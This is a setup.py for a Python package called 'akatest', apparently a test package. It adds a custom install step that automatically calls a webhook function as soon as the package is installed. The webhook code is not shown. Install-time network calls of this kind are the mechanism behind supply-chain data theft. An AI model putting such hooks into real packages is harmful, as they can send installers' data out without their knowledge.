# setup.py

import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install

# Custom install command to run after installation
class PostInstallCommand(install):
    def run(self):
        # Run the original install logic
        install.run(self)

        # Trigger the webhook after the package is installed
        print("Running the webhook call after installation...")
        # You can run a subprocess to call the webhook without importing the module directly
        subprocess.run(["python3", "-c", "from akatest.send_webhook import send_to_webhook; send_to_webhook()"])

# Setup the package and include the custom install logic
setup(
    name='akatest',
    version='0.1',
    packages=find_packages(),
    description='A simple package to send data to a webhook',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='Your Name',
    author_email='your_email@example.com',
    url='https://github.com/yourusername/my_webhook_package',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    install_requires=[],  # No external dependencies needed
    python_requires='>=3.6',
    cmdclass={'install': PostInstallCommand},  # Link the post-installation hook
)
